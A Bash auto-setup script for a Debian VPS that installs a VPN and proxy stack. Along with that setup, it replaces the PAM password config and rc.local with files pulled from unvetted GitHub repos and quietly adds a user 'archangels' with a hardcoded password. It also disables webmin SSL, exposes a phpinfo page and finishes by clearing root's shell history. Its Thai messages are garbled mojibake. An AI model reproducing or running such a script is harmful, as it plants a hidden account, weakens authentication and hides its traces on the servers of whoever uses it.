#!/bin/bash
echo -e "\e[40;38;5;226m " 
echo " WELCOME TO AUTOSCRIPT VpsProject "
echo "################################################################################" 
echo "#                                                                              #" 
echo "#      SSSSSSSSSSSSSSSSS  sssssssssssssssss  HHHHHHHHH        HHHHHHHHH        #" 
echo "#      SSSSSSSSSSSSSSSSS  SSSSSSSSSSSSSSSSS  HHHHHHHHH        HHHHHHHHH        #" 
echo "#      SSSSSS             SSSSSS             HHHHHHHHH        HHHHHHHHH        #" 
echo "#      SSSSSS             SSSSSS             HHHHHHHHH        HHHHHHHHH        #" 
echo "#      SSSSSSSSSSSSSSSSS  SSSSSSSSSSSSSSSSS  HHHHHHHHHHHHHHHHHHHHHHHHHH        #" 
echo "#      SSSSSSSSSSSSSSSSS  SSSSSSSSSSSSSSSSS  HHHHHHHHHHHHHHHHHHHHHHHHHH        #" 
echo "#                 SSSSSS             SSSSSS  HHHHHHHHH        HHHHHHHHH        #" 
echo "#                 SSSSSS             SSSSSS  HHHHHHHHH        HHHHHHHHH        #"
echo "#      SSSSSSSSSSSSSSSSS  SSSSSSSSSSSSSSSSS  HHHHHHHHH        HHHHHHHHH        #" 
echo "#      SSSSSSSSSSSSSSSSS  SSSSSSSSSSSSSSSSS  HHHHHHHHH        HHHHHHHHH        #" 
echo "#------------------------------------------------------------------------------#" 
echo "#          SELAMAT DATANG DI SCRIPT AUTO SETUP VPS BY VPSPROJECT.              #" 
echo "#                       SCRIPT VERSION V2.0 FOR DEBIAN 7-8-9                   #"
echo "#                               SEMOGA BERMANFAAT                              #" 
echo "#------------------------------------------------------------------------------#" 
echo "################################################################################"
echo "========================================"
echo "CLICK 'I' SETUP VPS Non-Local"
echo "CLICK 'L' SETUP VPS Local" 
echo "========================================"
read -p "Location : " -e loc
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Ã Â¸â€¢Ã Â¹â€°Ã Â¸Â­Ã Â¸â€¡Ã Â¹Æ’Ã Â¸Å Ã Â¹â€°Ã Â¸Â£Ã Â¸Â¹Ã Â¸â€”Ã Â¸â„¢Ã Â¸Â°"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Ã Â¸â€žÃ Â¸Â§Ã Â¸Â¢Ã Â¹â‚¬Ã Â¸Â­Ã Â¹â€°Ã Â¸Â¢ Ã Â¸Â£Ã Â¸Â¹Ã Â¸â€”"
exit 2
fi
if [[ ! -e /dev/net/tun ]]; then
echo "TUN Ã Â¹â€žÃ Â¸Â¡Ã Â¹Ë†Ã Â¸â€¢Ã Â¸Â­Ã Â¸Å¡Ã Â¸ÂªÃ Â¸â„¢Ã Â¸Â­Ã Â¸â€¡"
exit 3
fi
echo "Ã Â¸â€”Ã Â¸Â³Ã Â¹Æ’Ã Â¸Å Ã Â¹â€°Ã Â¹â‚¬Ã Â¸Â­Ã Â¸â€¡"
clear
echo "Ã Â¸â€¢Ã Â¸Â±Ã Â¹â€°Ã Â¸â€¡Ã Â¹â‚¬Ã Â¸Â§Ã Â¸Â¥Ã Â¸Â² Ã Â¸ÂÃ Â¸Â£Ã Â¸Â¸Ã Â¸â€¡Ã Â¹â‚¬Ã Â¸â€”Ã Â¸Å¾  +7"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "Ã Â¹â‚¬Ã Â¸â€ºÃ Â¸Â´Ã Â¸â€ IPV4 Ã Â¸ÂÃ Â¸Â±Ã Â¸Å¡ IPV6"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "Ã Â¹ÂÃ Â¸Å¾Ã Â¸â€ž Ã Â¸ÂªÃ Â¹ÂÃ Â¸â€ºÃ Â¸Â¡"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear

sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y autoremove;
apt-get -y install wget curl;
echo "
"
# detail
country=MY
state=Terengganu
locality=-
organization=Interpass
organizationalunit=InterpassGroup
commonname=Hake
email=-
cd

# script
wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/tinasetina/9/master/common-password"
chmod +x /etc/pam.d/common-password
# Install Dos Deflate
apt-get -y install dnsutils dsniff
wget https://raw.githubusercontent.com/tinasetina/9/master/ddos-deflate-master.zip
unzip master.zip
cd ddos-deflate-master
./install.sh
cd
service exim4 stop;sysv-rc-conf exim4 off;
# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
service ssh restart
# dropbear
apt-get -y install dropbear
wget -O /etc/default/dropbear "https://raw.githubusercontent.com/tinasetina/9/master/dropbear"
sed -i 's/DROPBEAR_BANNER=""/DROPBEAR_BANNER="\/etc\/issue.net"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
# install banner
cd
wget -O /etc/issue.net "https://raw.githubusercontent.com/tinasetina/9/master/banner.txt"
chmod +x /usr/bin/banner.txt
service dropbear restart
# squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/padubang/secret/main/028/squid.conf"
wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/padubang/secret/main/028/squid.conf"
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf

# install webserver
apt-get -y install nginx libexpat1-dev libxml-parser-perl

# install essential package
apt-get -y install nano iptables-persistent dnsutils screen whois ngrep unzip unrar

# Web Server
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/ara-rangers/vps/master/nginx.conf"
mkdir -p /home/vps/public_html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /home/vps/public_html/index.html https://raw.githubusercontent.com/padubang/secret/main/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ara-rangers/vps/master/vps.conf"
service nginx restart

#  openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://raw.githubusercontent.com/remajavpn/pos/main/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
chmod +x /etc/rc.local
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/remajavpn/pos/main/client.ovpn"
wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/remajavpn/pos/main/client1.ovpn"
wget -O /home/vps/public_html/sam.ovpn "https://gakod.com/debian/sam.ovpn"
wget -O /home/vps/public_html/udp.ovpn "https://gakod.com/4/udp.ovpn"
wget -O /etc/motd "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/motd"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/sam.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

# install vnstat gui
cd /home/vps/public_html/
wget https://raw.githubusercontent.com/tinasetina/9/master/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
cd
clear
# Install BadVPN
apt-get -y install cmake make gcc
wget https://raw.githubusercontent.com/tinasetina/9/master/badvpn-1.999.127.tar.bz2
tar xf badvpn-1.999.127.tar.bz2
mkdir badvpn-build
cd badvpn-build
cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
make install
screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
cd

# install stunnel
apt-get install stunnel4 -y
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
pid = /stunnel.pid
client = no	
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
[dropbear]
accept = 444
connect = 127.0.0.1:442
connect = 127.0.0.1:109
connect = 127.0.0.1:110
;[squid]
;accept = 8000
;connect = 127.0.0.1:3128
;connect = 127.0.0.1:80
;connect = 127.0.0.1:8080
END

#membuat sertifikat
openssl genrsa -out key.pem 2048
openssl req -new -x509 -key key.pem -out cert.pem -days 1095 \
-subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email"
cat key.pem cert.pem >> /etc/stunnel/stunnel.pem

#konfigurasi stunnel
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
/etc/init.d/stunnel4 restart

# Configure menu
apt-get install unzip
cd /usr/local/bin/
wget "https://raw.githubusercontent.com/padubang/secret/main/Ndnd/premiummenu.zip" 
unzip premiummenu.zip
chmod +x /usr/local/bin/*

clear
# restart service
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service webmin restart
service squid restart
service fail2ban restart
clear
# SELASAI SUDAH BOSS! ( AutoscriptByOrangKuatSabahanTerkini )
echo "========================================"  | tee -a log-install.txt
echo "Ã Â¸â€”Ã Â¸Â³Ã Â¹Æ’Ã Â¸Å Ã Â¹â€°Ã Â¹â€ Ã Â¹â€ Ã Â¹â€ Ã Â¹â€ Ã Â¹â€ Ã Â¹â€ Ã Â¹â€ Ã Â¹â€ Ã Â¹â€  Ã Â¹â‚¬Ã Â¸â€”Ã Â¹Ë†Ã Â¸Â²Ã Â¸â„¢Ã Â¸Â±Ã Â¹â€°Ã Â¸â„¢)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "Ã Â¸â€ºÃ Â¸Â¥Ã Â¸Â²Ã Â¸Â«Ã Â¸Â¡Ã Â¸Â¶Ã Â¸Â : 8080"  | tee -a log-install.txt
echo "Ã Â¹â‚¬Ã Â¸â€ºÃ Â¸Â´Ã Â¸â€Ã Â¹â‚¬Ã Â¸Â­Ã Â¸ÂªÃ Â¹â‚¬Ã Â¸Â­&Ã Â¸ÂªÃ Â¹â‚¬Ã Â¸Â­Ã Â¸Å  : 22"  | tee -a log-install.txt
echo "Ã Â¸Â§Ã Â¸Â²Ã Â¸â€¡Ã Â¸Â«Ã Â¸Â¡Ã Â¸Âµ : 443"  | tee -a log-install.txt
echo "Ã Â¹â‚¬Ã Â¸â€ºÃ Â¸Â´Ã Â¸â€Ã Â¸Â§Ã Â¸ÂµÃ Â¸Å¾Ã Â¸ÂµÃ Â¹â‚¬Ã Â¸Â­Ã Â¹â€¡Ã Â¸â„¢  : TCP 1194 (Ã Â¸Å¾Ã Â¸Â£Ã Â¹â€°Ã Â¸Â­Ã Â¸Â¡ bug)"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : Ã Â¸Å¾Ã Â¸Â´Ã Â¸Â¡Ã Â¸Å¾Ã Â¹Å’ menu Ã Â¹â‚¬Ã Â¸Å¾Ã Â¸Â·Ã Â¹Ë†Ã Â¸Â­Ã Â¹Æ’Ã Â¸Å Ã Â¹â€° menu script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      Ã Â¸Â£Ã Â¸ÂµÃ Â¹â‚¬Ã Â¸â€¹Ã Â¸Â´Ã Â¸Å¸Ã Â¸â€”Ã Â¸ÂµÃ Â¸â„¢Ã Â¸Â¶Ã Â¸â€¡      " 
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
